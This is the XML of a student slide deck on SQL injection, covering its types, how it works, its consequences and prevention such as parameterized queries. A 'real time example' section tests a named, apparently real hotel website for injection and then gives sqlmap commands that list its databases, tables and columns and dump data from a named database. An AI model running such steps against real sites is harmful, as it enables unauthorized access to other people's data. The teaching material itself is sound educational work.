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Dosis"/>
      <p:regular r:id="rId20"/>
      <p:bold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dstYXRInFuO6CE44qqlmeiJvd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osis-regular.fntdata"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/DMSans-regular.fntdata"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/Dosis-bold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1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17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1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17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17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7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17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17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1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7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17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0" name="Google Shape;70;p23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2" name="Google Shape;72;p23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5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7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7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9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6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embryohotel.com/room-detail.php?id=1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embryohotel.com/room-detail.php?id=1%27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1738962" y="307571"/>
            <a:ext cx="6582078" cy="7148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ON CYBERSECURITY </a:t>
            </a:r>
            <a:b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accent5"/>
              </a:solidFill>
            </a:endParaRPr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3152128" y="4878446"/>
            <a:ext cx="6232942" cy="1251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i="0" lang="en-US" u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ID: 23-SEP-24-SKL-CSPP-BUN-750-WDA14-HYD</a:t>
            </a:r>
            <a:endParaRPr b="1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i="0" lang="en-US" u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ID: PTID-CHE-JAN-25-069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i="0" lang="en-US" u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: Pathan Farhana</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp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59" y="1092610"/>
            <a:ext cx="2460568" cy="208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339" y="4342084"/>
            <a:ext cx="1769007" cy="1751806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47" name="Google Shape;147;p1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3682537" y="1394751"/>
            <a:ext cx="56027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533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on SQL injection attack </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="148" name="Google Shape;14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6527" y="2315635"/>
            <a:ext cx="2660073" cy="18692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"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3541222" y="3848793"/>
            <a:ext cx="4430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3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677334" y="1363287"/>
            <a:ext cx="8596668" cy="79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Contents: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US" sz="1800" u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US" sz="1800" u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Types of SQL Injection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US" sz="1800" u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How SQL Injection Works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US" sz="1800" u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Detect SQL injection vulnerability</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1800" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="222222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0" i="0" lang="en-US" sz="1800" u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Prevent SQL Injection</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1800" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="222222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 strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="222222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61" name="Google Shape;1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4756" y="1870364"/>
            <a:ext cx="4547062" cy="34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                 INTRODUCTION</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp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677334" y="1930399"/>
            <a:ext cx="8596668" cy="4110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injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.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This happens when user input is improperly filtered or sanitized before being used in an SQL query.</a:t>
            </a:r>
            <a:endParaRPr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i="0" lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="5C5C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allow an attacker to view data that they are not normally able to retrieve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169" y="4347710"/>
            <a:ext cx="3970422" cy="217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0" i="0" lang="en-US" sz="28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Types of SQL Injection</a:t>
            </a:r>
            <a:endParaRPr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5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="598516" y="1442923"/>
            <a:ext cx="8874992" cy="4697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several types of SQL Injection attacks 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are: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 (In-band) SQL Injection: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most common type. It uses the same communication channel to both launch the attack and gather results.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1. Error-based SQL Injection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2. Union-based SQL Injection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Out-of-Band SQL Injection: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attacker triggers actions that use different channels to gather information, such as DNS requests or HTTP requests to an external server.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Blind SQL Injection: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attacker does not receive any direct feedback from the application, but can infer information based on how the application responds. This is often used when error messages are hidden.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1.Boolean-based Blind SQL Injection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2.Time-based Blind SQL Injection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b="0" i="0" lang="en-US" sz="32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How SQL Injection Works</a:t>
            </a:r>
            <a:endParaRPr sz="32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1230284" y="2170929"/>
            <a:ext cx="7015941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Input Fields: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Attackers target login forms, search boxes, etc.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Malicious Input Submission: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Specially crafted SQL code alters database queries.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Un-sanitized Input Execution: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app doesn’t validate input, SQL code runs.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Execution &amp; Exploitation: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1.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bypass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        2.Data extraction &amp; modification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        3.Remote code execution Visual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8415" y="4247804"/>
            <a:ext cx="3352799" cy="21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type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="677334" y="609600"/>
            <a:ext cx="8596668" cy="612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Times New Roman"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="24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Real Time Example How SQL Injection Workout.</a:t>
            </a:r>
            <a:br>
              <a:rPr b="0"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0" y="1280160"/>
            <a:ext cx="9700953" cy="6101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: Firstly we have to take one website.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Example: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http://www.embryohotel.com/room-detail.php?id=1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 have to check whether that website have vulnerable or not.</a:t>
            </a:r>
            <a:endParaRPr/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908" y="2051449"/>
            <a:ext cx="6882939" cy="41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893993" y="634537"/>
            <a:ext cx="8596668" cy="1410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Step 2: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check if a website is vulnerable, we look for a numeric parameter in the URL and add a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quote (')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end. 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1800">
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Step 3: </a:t>
            </a:r>
            <a:r>
              <a:rPr b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website shows an error message like </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0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"you have an error in your SQL syntax", </a:t>
            </a:r>
            <a:r>
              <a:rPr b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means it might be vulnerable. </a:t>
            </a:r>
            <a:b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b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</a:t>
            </a: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http://www.embryohotel.com/room-detail.php?id=1%27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306" y="2463527"/>
            <a:ext cx="8000624" cy="4194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677334" y="157943"/>
            <a:ext cx="8596668" cy="6076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None/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="16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</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0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 have to Perform the SQL Injection by using the </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="16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SQLMap tool </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="16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 linux.</a:t>
            </a:r>
            <a:br>
              <a:rPr b="0"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16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perform the attack, open the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terminal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9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="677334" y="997526"/>
            <a:ext cx="8596668" cy="586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run the attack by using sql query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(sqlmap -u &lt;url&gt; --dbs)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--dbs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the list of databases from the website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identify the databases available on the website.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default, the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*information_schema*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is present, but it may not contain useful data.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command to list databases is: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sqlmap -u &lt;url&gt; --dbs  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command helps retrieve the available databases from the website.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668" y="1542700"/>
            <a:ext cx="8176969" cy="1310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7191" y="3643078"/>
            <a:ext cx="2626822" cy="1146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677334" y="609599"/>
            <a:ext cx="8596668" cy="5915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6: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 have retrieve the tables from the available database. By using the Query for retrieving </a:t>
            </a:r>
            <a:b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tables is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sqlmap -u &lt;url&gt; -D cp227754_embryohotel_db --tables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64" y="1369753"/>
            <a:ext cx="8596312" cy="14981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/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="771693" y="2986060"/>
            <a:ext cx="840794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extract the list of tables from the available database. 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command to achieve this is: sqlmap -u &lt;url&gt; -D cp227754_embryohotel_db --tables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--tables flag retrieves the names of all tables within the specified database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229" y="3697287"/>
            <a:ext cx="2003369" cy="211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677334" y="609600"/>
            <a:ext cx="8596668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7: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we have retrieve the columns from the </a:t>
            </a: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name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By using the Query for retrieving </a:t>
            </a:r>
            <a:b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columns is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sqlmap -u &lt;url&gt; -D cp227754_embryohotel_db –T room --columns</a:t>
            </a:r>
            <a:endParaRPr sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="216" name="Google Shape;21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1467280"/>
            <a:ext cx="8596312" cy="1660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 txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="598517" y="3191365"/>
            <a:ext cx="8478981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extract the list of columns from the given table name. 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command to achieve this is: sqlmap -u &lt;url&gt; -D cp227754_embryohotel_db –T room --columns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--columns flag retrieves the names of all columns within the specified table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1498" y="4029736"/>
            <a:ext cx="2227580" cy="217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type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="677334" y="609600"/>
            <a:ext cx="8596668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None/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="16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8: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0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we retrieve the Enumerate DBMS database table columns, the query is </a:t>
            </a:r>
            <a:br>
              <a:rPr b="0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sqlmap -u &lt;url&gt; -D cp227754_embryohotel_db –T room –C r_detail,r_name –dump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r>
              <a:rPr b="1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‘--dump’ </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0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in the form of lists database.</a:t>
            </a:r>
            <a:br>
              <a:rPr b="0" i="0" lang="en-US" sz="160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690" y="1345414"/>
            <a:ext cx="8596312" cy="14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4136" y="3733800"/>
            <a:ext cx="3513124" cy="20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          Consequences of SQL Injection</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="36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Breach: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Unauthorized access to personal/financial data.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Loss/Corruption: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Attackers modify or delete data.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Reputation Damage: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Loss of customer trust &amp; brand credibility.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Financial Loss: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Legal penalties, fines, and operational costs.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Visual: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Infographic showing SQLi consequences.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-251459" lvl="0" marL="342900" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="18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Times New Roman"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="4000" u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Prevent SQL Injection</a:t>
            </a:r>
            <a:br>
              <a:rPr b="0" lang="en-US"/>
            </a:br>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="237" name="Google Shape;237;p14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Prepared Statements (Parameterized Queries):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Prepared statements ensure that user input is treated as data rather than executable code.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Stored Procedures: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Stored procedures help separate SQL logic from application code.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Validation &amp; Sanitization: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Validate input formats (e.g., email, numbers, lengths).Restrict special characters where unnecessary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Avoid displaying detailed error messages to users, as they may give attackers clues about the database structure.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0" marL="342900" rtl="0" algn="l"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2025-01-30T04:40:50Z</dcterms:created>
  <dc:creator>pathan.farhana283@gmail.com</dc:creator>
</cp:coreProperties>
</file>